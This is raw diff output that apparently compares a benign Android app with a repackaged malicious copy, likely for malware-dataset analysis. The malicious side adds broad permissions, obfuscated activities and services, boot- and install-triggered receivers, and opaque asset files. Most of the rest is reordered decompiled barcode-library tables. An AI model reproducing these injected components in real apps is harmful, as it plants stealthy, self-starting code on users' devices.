@@ -1,0 +1,2434 @@
+diff -r result/APP_101/App_B_101/AndroidManifest.xml result/APP_101/App_M_101/AndroidManifest.xml
+3a4,11
+>     <uses-permission android:name="android.permission.INTERNET"/>
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.GET_TASKS"/>
+>     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+26a35,100
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="com.sumase.nuatie.wulley.NsoanActivity"/>
+>         <service android:name="com.sumase.nuatie.wulley.PsemkwinActivity"/>
+>         <receiver android:name="com.sumase.nuatie.wulley.RsollyActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="com.luotuy.mustn.CllenActivity"/>
+>         <service android:name="com.luotuy.mustn.BaseOseAveyen"/>
+>         <receiver android:name="com.luotuy.mustn.VenrowoActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:name="com.fuonw.suoetl.cuoll.ZusnActivity"/>
+>         <receiver android:name="com.fuonw.suoetl.cuoll.TsenaActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
+>             </intent-filter>
+>         </receiver>
+>         <service android:name="com.fuonw.suoetl.cuoll.CusanActivity"/>
+>         <activity android:excludeFromRecents="true" android:launchMode="singleTask" android:name="com.hunstun.tallsyen.blawe.DslenActivity"/>
+>         <service android:name="com.hunstun.tallsyen.blawe.SomeKsleActivity"/>
+>         <receiver android:name="com.hunstun.tallsyen.blawe.RsekleeActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:launchMode="singleTask" android:name="com.hunstun.tallsyen.blawe.adermo.MsienActivity" android:screenOrientation="portrait"/>
+>         <receiver android:name="com.hunstun.tallsyen.blawe.adermo.RsamnActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>         </receiver>
+diff -r result/APP_101/App_B_101/apktool.yml result/APP_101/App_M_101/apktool.yml
+2c2
+< apkFileName: Bapp101-D4703192836F76C1AB44C692BE1A8231BB97E5D0365B82F3C99478651EA56215.apk
+---
+> apkFileName: Mapp101-276DC8013A631D7A3368F9F264C42C1EE64B928DF3FBD535EB962E738A1BD423.apk
+6d5
+< - gif
+8,10d6
+< - wav
+< - res/raw/bundle.zip
+< - jpg
+11a8,11
+> - jpg
+> - res/raw/bundle.zip
+> - wav
+> - gif
+21,147c21
+< unknownFiles:
+<   assembly-descriptor.xml: '8'
+<   com/appMobiCloud/license.txt.rtf: '8'
+<   org/apache/commons/codec/language/bm/ash_approx_any.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_approx_common.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_approx_cyrillic.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_approx_english.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_approx_french.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_approx_german.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_approx_hebrew.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_approx_hungarian.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_approx_polish.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_approx_romanian.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_approx_russian.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_approx_spanish.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_exact_any.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_exact_approx_common.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_exact_common.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_exact_cyrillic.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_exact_english.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_exact_french.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_exact_german.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_exact_hebrew.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_exact_hungarian.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_exact_polish.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_exact_romanian.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_exact_russian.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_exact_spanish.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_hebrew_common.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_languages.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_rules_any.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_rules_cyrillic.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_rules_english.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_rules_french.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_rules_german.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_rules_hebrew.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_rules_hungarian.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_rules_polish.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_rules_romanian.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_rules_russian.txt: '8'
+<   org/apache/commons/codec/language/bm/ash_rules_spanish.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_approx_any.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_approx_arabic.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_approx_common.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_approx_cyrillic.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_approx_czech.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_approx_dutch.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_approx_english.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_approx_french.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_approx_german.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_approx_greek.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_approx_greeklatin.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_approx_hebrew.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_approx_hungarian.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_approx_italian.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_approx_polish.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_approx_portuguese.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_approx_romanian.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_approx_russian.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_approx_spanish.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_approx_turkish.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_exact_any.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_exact_approx_common.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_exact_arabic.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_exact_common.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_exact_cyrillic.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_exact_czech.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_exact_dutch.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_exact_english.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_exact_french.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_exact_german.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_exact_greek.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_exact_greeklatin.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_exact_hebrew.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_exact_hungarian.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_exact_italian.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_exact_polish.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_exact_portuguese.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_exact_romanian.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_exact_russian.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_exact_spanish.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_exact_turkish.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_hebrew_common.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_languages.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_rules_any.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_rules_arabic.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_rules_cyrillic.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_rules_czech.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_rules_dutch.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_rules_english.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_rules_french.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_rules_german.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_rules_greek.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_rules_greeklatin.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_rules_hebrew.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_rules_hungarian.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_rules_italian.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_rules_polish.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_rules_portuguese.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_rules_romanian.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_rules_russian.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_rules_spanish.txt: '8'
+<   org/apache/commons/codec/language/bm/gen_rules_turkish.txt: '8'
+<   org/apache/commons/codec/language/bm/lang.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_approx_any.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_approx_common.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_approx_french.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_approx_hebrew.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_approx_italian.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_approx_portuguese.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_approx_spanish.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_exact_any.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_exact_approx_common.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_exact_common.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_exact_french.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_exact_hebrew.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_exact_italian.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_exact_portuguese.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_exact_spanish.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_hebrew_common.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_languages.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_rules_any.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_rules_french.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_rules_hebrew.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_rules_italian.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_rules_portuguese.txt: '8'
+<   org/apache/commons/codec/language/bm/sep_rules_spanish.txt: '8'
+---
+> unknownFiles: {}
+Somente em result/APP_101/App_M_101/assets: 9.dat
+Somente em result/APP_101/App_M_101/assets: jawz
+Somente em result/APP_101/App_M_101/assets: topsen
+Somente em result/APP_101/App_M_101/com: fuonw
+diff -r result/APP_101/App_B_101/com/google/zxing/oned/Code128Reader.java result/APP_101/App_M_101/com/google/zxing/oned/Code128Reader.java
+34,48c34,48
+<     int[] arrayOfInt1 = { 2, 1, 2, 2, 2, 2 };
+<     int[] arrayOfInt2 = { 2, 2, 2, 2, 2, 1 };
+<     int[] arrayOfInt3 = { 1, 3, 1, 2, 2, 2 };
+<     int[] arrayOfInt4 = { 1, 2, 2, 2, 1, 3 };
+<     int[] arrayOfInt5 = { 1, 3, 2, 2, 1, 2 };
+<     int[] arrayOfInt6 = { 2, 3, 1, 2, 1, 2 };
+<     int[] arrayOfInt7 = { 1, 2, 2, 2, 3, 1 };
+<     int[] arrayOfInt8 = { 1, 1, 3, 2, 2, 2 };
+<     int[] arrayOfInt9 = { 2, 2, 3, 1, 1, 2 };
+<     int[] arrayOfInt10 = { 3, 1, 1, 2, 2, 2 };
+<     int[] arrayOfInt11 = { 3, 2, 1, 1, 2, 2 };
+<     int[] arrayOfInt12 = { 3, 2, 2, 2, 1, 1 };
+<     int[] arrayOfInt13 = { 1, 3, 1, 3, 2, 1 };
+<     int[] arrayOfInt14 = { 2, 1, 1, 3, 1, 3 };
+<     int[] arrayOfInt15 = { 3, 1, 3, 1, 2, 1 };
+---
+>     int[] arrayOfInt1 = { 2, 2, 2, 1, 2, 2 };
+>     int[] arrayOfInt2 = { 1, 2, 1, 3, 2, 2 };
+>     int[] arrayOfInt3 = { 1, 2, 2, 2, 1, 3 };
+>     int[] arrayOfInt4 = { 1, 3, 2, 2, 1, 2 };
+>     int[] arrayOfInt5 = { 2, 2, 1, 2, 1, 3 };
+>     int[] arrayOfInt6 = { 1, 2, 2, 2, 3, 1 };
+>     int[] arrayOfInt7 = { 3, 2, 1, 1, 2, 2 };
+>     int[] arrayOfInt8 = { 2, 3, 2, 1, 2, 1 };
+>     int[] arrayOfInt9 = { 1, 3, 1, 1, 2, 3 };
+>     int[] arrayOfInt10 = { 1, 3, 2, 1, 1, 3 };
+>     int[] arrayOfInt11 = { 2, 3, 1, 3, 1, 1 };
+>     int[] arrayOfInt12 = { 1, 1, 2, 3, 3, 1 };
+>     int[] arrayOfInt13 = { 3, 1, 3, 1, 2, 1 };
+>     int[] arrayOfInt14 = { 2, 1, 1, 3, 3, 1 };
+>     int[] arrayOfInt15 = { 2, 1, 3, 1, 1, 3 };
+50c50
+<     int[] arrayOfInt17 = { 3, 1, 1, 1, 2, 3 };
+---
+>     int[] arrayOfInt17 = { 2, 1, 3, 1, 3, 1 };
+52,73c52,64
+<     int[] arrayOfInt19 = { 3, 1, 4, 1, 1, 1 };
+<     int[] arrayOfInt20 = { 2, 2, 1, 4, 1, 1 };
+<     int[] arrayOfInt21 = { 1, 1, 1, 4, 2, 2 };
+<     int[] arrayOfInt22 = { 1, 4, 1, 1, 2, 2 };
+<     int[] arrayOfInt23 = { 1, 1, 2, 2, 1, 4 };
+<     int[] arrayOfInt24 = { 1, 2, 2, 1, 1, 4 };
+<     int[] arrayOfInt25 = { 1, 2, 2, 4, 1, 1 };
+<     int[] arrayOfInt26 = { 1, 4, 2, 1, 1, 2 };
+<     int[] arrayOfInt27 = { 1, 1, 1, 2, 4, 2 };
+<     int[] arrayOfInt28 = { 1, 2, 1, 1, 4, 2 };
+<     int[] arrayOfInt29 = { 1, 1, 4, 2, 1, 2 };
+<     int[] arrayOfInt30 = { 4, 2, 1, 1, 1, 2 };
+<     int[] arrayOfInt31 = { 4, 2, 1, 2, 1, 1 };
+<     int[] arrayOfInt32 = { 4, 1, 2, 1, 2, 1 };
+<     int[] arrayOfInt33 = { 1, 3, 1, 1, 4, 1 };
+<     int[] arrayOfInt34 = { 1, 1, 4, 1, 1, 3 };
+<     int[] arrayOfInt35 = { 1, 1, 3, 1, 4, 1 };
+<     int[] arrayOfInt36 = { 3, 1, 1, 1, 4, 1 };
+<     int[] arrayOfInt37 = { 4, 1, 1, 1, 3, 1 };
+<     int[] arrayOfInt38 = { 2, 1, 1, 2, 1, 4 };
+<     int[] arrayOfInt39 = { 2, 1, 1, 2, 3, 2 };
+<     CODE_PATTERNS = new int[][] { arrayOfInt1, { 2, 2, 2, 1, 2, 2 }, arrayOfInt2, { 1, 2, 1, 2, 2, 3 }, { 1, 2, 1, 3, 2, 2 }, arrayOfInt3, arrayOfInt4, { 1, 2, 2, 3, 1, 2 }, arrayOfInt5, { 2, 2, 1, 2, 1, 3 }, { 2, 2, 1, 3, 1, 2 }, arrayOfInt6, { 1, 1, 2, 2, 3, 2 }, { 1, 2, 2, 1, 3, 2 }, arrayOfInt7, arrayOfInt8, { 1, 2, 3, 1, 2, 2 }, { 1, 2, 3, 2, 2, 1 }, { 2, 2, 3, 2, 1, 1 }, { 2, 2, 1, 1, 3, 2 }, { 2, 2, 1, 2, 3, 1 }, { 2, 1, 3, 2, 1, 2 }, arrayOfInt9, { 3, 1, 2, 1, 3, 1 }, arrayOfInt10, arrayOfInt11, { 3, 2, 1, 2, 2, 1 }, { 3, 1, 2, 2, 1, 2 }, { 3, 2, 2, 1, 1, 2 }, arrayOfInt12, { 2, 1, 2, 1, 2, 3 }, { 2, 1, 2, 3, 2, 1 }, { 2, 3, 2, 1, 2, 1 }, { 1, 1, 1, 3, 2, 3 }, { 1, 3, 1, 1, 2, 3 }, arrayOfInt13, { 1, 1, 2, 3, 1, 3 }, { 1, 3, 2, 1, 1, 3 }, { 1, 3, 2, 3, 1, 1 }, arrayOfInt14, { 2, 3, 1, 1, 1, 3 }, { 2, 3, 1, 3, 1, 1 }, { 1, 1, 2, 1, 3, 3 }, { 1, 1, 2, 3, 3, 1 }, { 1, 3, 2, 1, 3, 1 }, { 1, 1, 3, 1, 2, 3 }, { 1, 1, 3, 3, 2, 1 }, { 1, 3, 3, 1, 2, 1 }, arrayOfInt15, { 2, 1, 1, 3, 3, 1 }, { 2, 3, 1, 1, 3, 1 }, { 2, 1, 3, 1, 1, 3 }, arrayOfInt16, { 2, 1, 3, 1, 3, 1 }, arrayOfInt17, { 3, 1, 1, 3, 2, 1 }, arrayOfInt18, { 3, 1, 2, 1, 1, 3 }, { 3, 1, 2, 3, 1, 1 }, { 3, 3, 2, 1, 1, 1 }, arrayOfInt19, arrayOfInt20, { 4, 3, 1, 1, 1, 1 }, { 1, 1, 1, 2, 2, 4 }, arrayOfInt21, { 1, 2, 1, 1, 2, 4 }, { 1, 2, 1, 4, 2, 1 }, arrayOfInt22, { 1, 4, 1, 2, 2, 1 }, arrayOfInt23, { 1, 1, 2, 4, 1, 2 }, arrayOfInt24, arrayOfInt25, arrayOfInt26, { 1, 4, 2, 2, 1, 1 }, { 2, 4, 1, 2, 1, 1 }, { 2, 2, 1, 1, 1, 4 }, { 4, 1, 3, 1, 1, 1 }, { 2, 4, 1, 1, 1, 2 }, { 1, 3, 4, 1, 1, 1 }, arrayOfInt27, arrayOfInt28, { 1, 2, 1, 2, 4, 1 }, arrayOfInt29, { 1, 2, 4, 1, 1, 2 }, { 1, 2, 4, 2, 1, 1 }, { 4, 1, 1, 2, 1, 2 }, arrayOfInt30, arrayOfInt31, { 2, 1, 2, 1, 4, 1 }, { 2, 1, 4, 1, 2, 1 }, arrayOfInt32, { 1, 1, 1, 1, 4, 3 }, { 1, 1, 1, 3, 4, 1 }, arrayOfInt33, arrayOfInt34, { 1, 1, 4, 3, 1, 1 }, { 4, 1, 1, 1, 1, 3 }, { 4, 1, 1, 3, 1, 1 }, arrayOfInt35, { 1, 1, 4, 1, 3, 1 }, arrayOfInt36, arrayOfInt37, { 2, 1, 1, 4, 1, 2 }, arrayOfInt38, arrayOfInt39, { 2, 3, 3, 1, 1, 1, 2 } };
+---
+>     int[] arrayOfInt19 = { 1, 1, 1, 4, 2, 2 };
+>     int[] arrayOfInt20 = { 1, 4, 1, 1, 2, 2 };
+>     int[] arrayOfInt21 = { 1, 1, 2, 2, 1, 4 };
+>     int[] arrayOfInt22 = { 1, 2, 2, 1, 1, 4 };
+>     int[] arrayOfInt23 = { 2, 2, 1, 1, 1, 4 };
+>     int[] arrayOfInt24 = { 2, 4, 1, 1, 1, 2 };
+>     int[] arrayOfInt25 = { 1, 3, 4, 1, 1, 1 };
+>     int[] arrayOfInt26 = { 4, 1, 2, 1, 2, 1 };
+>     int[] arrayOfInt27 = { 1, 1, 4, 1, 1, 3 };
+>     int[] arrayOfInt28 = { 4, 1, 1, 1, 3, 1 };
+>     int[] arrayOfInt29 = { 2, 1, 1, 2, 1, 4 };
+>     int[] arrayOfInt30 = { 2, 3, 3, 1, 1, 1, 2 };
+>     CODE_PATTERNS = new int[][] { { 2, 1, 2, 2, 2, 2 }, arrayOfInt1, { 2, 2, 2, 2, 2, 1 }, { 1, 2, 1, 2, 2, 3 }, arrayOfInt2, { 1, 3, 1, 2, 2, 2 }, arrayOfInt3, { 1, 2, 2, 3, 1, 2 }, arrayOfInt4, arrayOfInt5, { 2, 2, 1, 3, 1, 2 }, { 2, 3, 1, 2, 1, 2 }, { 1, 1, 2, 2, 3, 2 }, { 1, 2, 2, 1, 3, 2 }, arrayOfInt6, { 1, 1, 3, 2, 2, 2 }, { 1, 2, 3, 1, 2, 2 }, { 1, 2, 3, 2, 2, 1 }, { 2, 2, 3, 2, 1, 1 }, { 2, 2, 1, 1, 3, 2 }, { 2, 2, 1, 2, 3, 1 }, { 2, 1, 3, 2, 1, 2 }, { 2, 2, 3, 1, 1, 2 }, { 3, 1, 2, 1, 3, 1 }, { 3, 1, 1, 2, 2, 2 }, arrayOfInt7, { 3, 2, 1, 2, 2, 1 }, { 3, 1, 2, 2, 1, 2 }, { 3, 2, 2, 1, 1, 2 }, { 3, 2, 2, 2, 1, 1 }, { 2, 1, 2, 1, 2, 3 }, { 2, 1, 2, 3, 2, 1 }, arrayOfInt8, { 1, 1, 1, 3, 2, 3 }, arrayOfInt9, { 1, 3, 1, 3, 2, 1 }, { 1, 1, 2, 3, 1, 3 }, arrayOfInt10, { 1, 3, 2, 3, 1, 1 }, { 2, 1, 1, 3, 1, 3 }, { 2, 3, 1, 1, 1, 3 }, arrayOfInt11, { 1, 1, 2, 1, 3, 3 }, arrayOfInt12, { 1, 3, 2, 1, 3, 1 }, { 1, 1, 3, 1, 2, 3 }, { 1, 1, 3, 3, 2, 1 }, { 1, 3, 3, 1, 2, 1 }, arrayOfInt13, arrayOfInt14, { 2, 3, 1, 1, 3, 1 }, arrayOfInt15, arrayOfInt16, arrayOfInt17, { 3, 1, 1, 1, 2, 3 }, { 3, 1, 1, 3, 2, 1 }, arrayOfInt18, { 3, 1, 2, 1, 1, 3 }, { 3, 1, 2, 3, 1, 1 }, { 3, 3, 2, 1, 1, 1 }, { 3, 1, 4, 1, 1, 1 }, { 2, 2, 1, 4, 1, 1 }, { 4, 3, 1, 1, 1, 1 }, { 1, 1, 1, 2, 2, 4 }, arrayOfInt19, { 1, 2, 1, 1, 2, 4 }, { 1, 2, 1, 4, 2, 1 }, arrayOfInt20, { 1, 4, 1, 2, 2, 1 }, arrayOfInt21, { 1, 1, 2, 4, 1, 2 }, arrayOfInt22, { 1, 2, 2, 4, 1, 1 }, { 1, 4, 2, 1, 1, 2 }, { 1, 4, 2, 2, 1, 1 }, { 2, 4, 1, 2, 1, 1 }, arrayOfInt23, { 4, 1, 3, 1, 1, 1 }, arrayOfInt24, arrayOfInt25, { 1, 1, 1, 2, 4, 2 }, { 1, 2, 1, 1, 4, 2 }, { 1, 2, 1, 2, 4, 1 }, { 1, 1, 4, 2, 1, 2 }, { 1, 2, 4, 1, 1, 2 }, { 1, 2, 4, 2, 1, 1 }, { 4, 1, 1, 2, 1, 2 }, { 4, 2, 1, 1, 1, 2 }, { 4, 2, 1, 2, 1, 1 }, { 2, 1, 2, 1, 4, 1 }, { 2, 1, 4, 1, 2, 1 }, arrayOfInt26, { 1, 1, 1, 1, 4, 3 }, { 1, 1, 1, 3, 4, 1 }, { 1, 3, 1, 1, 4, 1 }, arrayOfInt27, { 1, 1, 4, 3, 1, 1 }, { 4, 1, 1, 1, 1, 3 }, { 4, 1, 1, 3, 1, 1 }, { 1, 1, 3, 1, 4, 1 }, { 1, 1, 4, 1, 3, 1 }, { 3, 1, 1, 1, 4, 1 }, arrayOfInt28, { 2, 1, 1, 4, 1, 2 }, arrayOfInt29, { 2, 1, 1, 2, 3, 2 }, arrayOfInt30 };
+diff -r result/APP_101/App_B_101/com/google/zxing/oned/ITFReader.java result/APP_101/App_M_101/com/google/zxing/oned/ITFReader.java
+28,31c28,33
+<     int[] arrayOfInt1 = { 1, 1, 3, 3, 1 };
+<     int[] arrayOfInt2 = { 3, 1, 3, 1, 1 };
+<     int[] arrayOfInt3 = { 1, 3, 1, 3, 1 };
+<     PATTERNS = new int[][] { arrayOfInt1, { 3, 1, 1, 1, 3 }, { 1, 3, 1, 1, 3 }, { 3, 3, 1, 1, 1 }, { 1, 1, 3, 1, 3 }, arrayOfInt2, { 1, 3, 3, 1, 1 }, { 1, 1, 1, 3, 3 }, { 3, 1, 1, 3, 1 }, arrayOfInt3 };
+---
+>     int[] arrayOfInt1 = { 3, 1, 1, 1, 3 };
+>     int[] arrayOfInt2 = { 3, 3, 1, 1, 1 };
+>     int[] arrayOfInt3 = { 3, 1, 3, 1, 1 };
+>     int[] arrayOfInt4 = { 1, 1, 1, 3, 3 };
+>     int[] arrayOfInt5 = { 3, 1, 1, 3, 1 };
+>     PATTERNS = new int[][] { { 1, 1, 3, 3, 1 }, arrayOfInt1, { 1, 3, 1, 1, 3 }, arrayOfInt2, { 1, 1, 3, 1, 3 }, arrayOfInt3, { 1, 3, 3, 1, 1 }, arrayOfInt4, arrayOfInt5, { 1, 3, 1, 3, 1 } };
+diff -r result/APP_101/App_B_101/com/google/zxing/oned/rss/expanded/decoders/FieldParser.java result/APP_101/App_M_101/com/google/zxing/oned/rss/expanded/decoders/FieldParser.java
+15,19c15,22
+<     Object localObject1 = new Integer(18);
+<     Object localObject25 = { "01", new Integer(14) };
+<     Object localObject26 = { "02", new Integer(14) };
+<     Object localObject2 = VARIABLE_LENGTH;
+<     Object localObject3 = new Integer(20);
+---
+>     Object localObject9 = { "00", new Integer(18) };
+>     Object localObject10 = { "01", new Integer(14) };
+>     Object localObject11 = { "02", new Integer(14) };
+>     Object localObject1 = VARIABLE_LENGTH;
+>     Object localObject2 = new Integer(20);
+>     Object localObject12 = { "11", new Integer(6) };
+>     Object localObject13 = { "12", new Integer(6) };
+>     Object localObject14 = { "13", new Integer(6) };
+22,25c25,33
+<     Object localObject4 = new Integer(6);
+<     Object localObject27 = { "15", new Integer(6) };
+<     Object localObject28 = { "17", new Integer(6) };
+<     Object localObject29 = { "20", new Integer(2) };
+---
+>     Object localObject15 = { "20", new Integer(2) };
+>     Object localObject16 = { "21", VARIABLE_LENGTH, new Integer(20) };
+>     Object localObject17 = { "22", VARIABLE_LENGTH, new Integer(29) };
+>     Object localObject18 = { "30", VARIABLE_LENGTH, new Integer(8) };
+>     Object localObject3 = VARIABLE_LENGTH;
+>     Object localObject4 = new Integer(8);
+>     Object localObject19 = { "90", VARIABLE_LENGTH, new Integer(30) };
+>     Object localObject20 = { "91", VARIABLE_LENGTH, new Integer(30) };
+>     Object localObject21 = { "92", VARIABLE_LENGTH, new Integer(30) };
+27c35,36
+<     Object localObject6 = new Integer(20);
+---
+>     Object localObject6 = new Integer(30);
+>     Object localObject22 = { "94", VARIABLE_LENGTH, new Integer(30) };
+29,54c38,53
+<     Object localObject8 = new Integer(29);
+<     Object localObject30 = { "30", VARIABLE_LENGTH, new Integer(8) };
+<     Object localObject31 = { "37", VARIABLE_LENGTH, new Integer(8) };
+<     Object localObject32 = { "90", VARIABLE_LENGTH, new Integer(30) };
+<     Object localObject9 = VARIABLE_LENGTH;
+<     Object localObject10 = new Integer(30);
+<     Object localObject11 = VARIABLE_LENGTH;
+<     Object localObject12 = new Integer(30);
+<     Object localObject13 = VARIABLE_LENGTH;
+<     Object localObject14 = new Integer(30);
+<     Object localObject15 = VARIABLE_LENGTH;
+<     Object localObject16 = new Integer(30);
+<     Object localObject17 = VARIABLE_LENGTH;
+<     Object localObject18 = new Integer(30);
+<     Object localObject19 = VARIABLE_LENGTH;
+<     Object localObject20 = new Integer(30);
+<     Object localObject21 = VARIABLE_LENGTH;
